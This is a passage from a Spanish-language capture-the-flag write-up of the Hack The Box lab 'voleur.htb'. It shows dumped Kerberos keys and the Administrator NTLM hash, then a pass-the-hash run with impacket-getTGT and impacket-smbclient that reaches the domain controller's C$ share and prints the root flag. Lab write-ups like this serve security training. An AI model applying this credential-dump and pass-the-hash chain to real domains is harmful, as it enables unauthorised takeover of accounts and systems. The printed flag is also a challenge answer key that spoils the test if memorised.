voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```

Obtenemos el hash NTLM del administrador:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

Intentamos ingresar por evil-winrm pero no obtenemos resultados.

Repetimos el proceso de obtener un TGT pero con el hash:

1. Solicitamos el TGT

```bash
impacket-getTGT voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

2. Exportamos el TGT
```bash                                                                                                                                                                                                                                            
 export KRB5CCNAME=Administrator.ccache                                            
```

3. Nos conectamos por smb y obtenemos el flag
```bash
 impacket-smbclient dc.voleur.htb -k                                               
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use C$
# ls
drw-rw-rw-          0  Thu Jan 30 08:39:05 2025 $Recycle.Bin
drw-rw-rw-          0  Mon Jun 30 18:08:33 2025 $WinREAgent
drw-rw-rw-          0  Thu Jul 24 17:10:36 2025 Config.Msi
drw-rw-rw-          0  Wed Jan 29 01:34:36 2025 Documents and Settings
-rw-rw-rw-      12288  Fri Sep 19 16:53:30 2025 DumpStack.log.tmp
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 Finance
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 HR
drw-rw-rw-          0  Thu May 29 19:08:02 2025 inetpub
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 IT
-rw-rw-rw-  738197504  Fri Sep 19 16:53:30 2025 pagefile.sys
drw-rw-rw-          0  Wed Jan 29 01:33:19 2025 PerfLogs
drw-rw-rw-          0  Thu Jul 24 17:10:07 2025 Program Files
drw-rw-rw-          0  Thu Jan 30 10:53:33 2025 Program Files (x86)
drw-rw-rw-          0  Wed Jun  4 19:34:01 2025 ProgramData
drw-rw-rw-          0  Wed Jan 29 01:34:37 2025 Recovery
drw-rw-rw-          0  Thu Jan 30 08:49:15 2025 System Volume Information
drw-rw-rw-          0  Thu Jan 30 08:38:57 2025 Users
drw-rw-rw-          0  Thu Jun  5 16:53:29 2025 Windows
# cd Users
# ls                                                                                                                                                                                                                                        
drw-rw-rw-          0  Thu Jan 30 08:38:57 2025 .                                                                                                                                                                                           
drw-rw-rw-          0  Thu Jul 24 17:09:59 2025 ..                                                                                                                                                                                          
drw-rw-rw-          0  Thu Jun  5 19:30:28 2025 Administrator                                                                                                                                                                               
drw-rw-rw-          0  Wed Jan 29 01:33:33 2025 All Users                                                                                                                                                                                   
drw-rw-rw-          0  Wed Jan 29 01:34:36 2025 Default                                                                                                                                                                                     
drw-rw-rw-          0  Wed Jan 29 01:33:33 2025 Default User                                                                                                                                                                                
-rw-rw-rw-        174  Wed Jan 29 01:32:18 2025 desktop.ini                                                                                                                                                                                 
drw-rw-rw-          0  Wed Jan 29 12:12:31 2025 jeremy.combs                                                                                                                                                                                
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Public                                                                                                                                                                                      
drw-rw-rw-          0  Thu Jan 30 08:39:00 2025 svc_backup                                                                                                                                                                                  
drw-rw-rw-          0  Wed Jan 29 09:47:16 2025 svc_ldap                                                                                                                                                                                    
drw-rw-rw-          0  Wed Jan 29 12:12:41 2025 svc_winrm                                                                                                                                                                                   
drw-rw-rw-          0  Wed Jan 29 09:53:09 2025 todd.wolfe                                                                                                                                                                                  
# cd Administrator                                                                                                                                                                                                                          
# ls                                                                                                                                                                                                                                        
drw-rw-rw-          0  Thu Jun  5 19:30:28 2025 .                                                                                                                                                                                           
drw-rw-rw-          0  Thu Jan 30 08:38:57 2025 ..                                                                                                                                                                                          
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 3D Objects                                                                                                                                                                                  
drw-rw-rw-          0  Fri Sep 19 16:54:28 2025 AppData
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 Application Data
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Contacts
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 Cookies
drw-rw-rw-          0  Thu Jun  5 19:33:05 2025 Desktop
drw-rw-rw-          0  Wed May  7 20:57:42 2025 Documents
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Downloads
drw-rw-rw-          0  Tue Jan 28 17:35:39 2025 Favorites
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Links
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 Local Settings
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Music
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 My Documents
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 NetHood
-rw-rw-rw-     786432  Tue Jan 28 17:35:30 2025 NTUSER.DAT
-rw-rw-rw-     163840  Tue Jan 28 17:35:31 2025 ntuser.dat.LOG1
-rw-rw-rw-      49152  Tue Jan 28 17:35:31 2025 ntuser.dat.LOG2
-rw-rw-rw-      65536  Wed Jan 29 05:34:35 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Tue Jan 28 17:35:31 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Tue Jan 28 17:35:31 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 05:35:03 2025 ntuser.ini
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Pictures
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 PrintHood
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 Recent
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Saved Games
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Searches
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 SendTo
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 Start Menu
drw-rw-rw-          0  Tue Jan 28 17:35:31 2025 Templates
drw-rw-rw-          0  Tue Jan 28 17:35:34 2025 Videos
# cd Desktop
# ls
drw-rw-rw-          0  Thu Jun  5 19:33:05 2025 .
drw-rw-rw-          0  Thu Jun  5 19:30:28 2025 ..
-rw-rw-rw-        282  Tue Jan 28 17:35:34 2025 desktop.ini
-rw-rw-rw-       2308  Wed Jan 29 06:12:10 2025 Microsoft Edge.lnk
-rw-rw-rw-         34  Fri Sep 19 16:54:28 2025 root.txt
# cat root.txt
a00f44731809ae9858b65ae450b476c3

# 
```






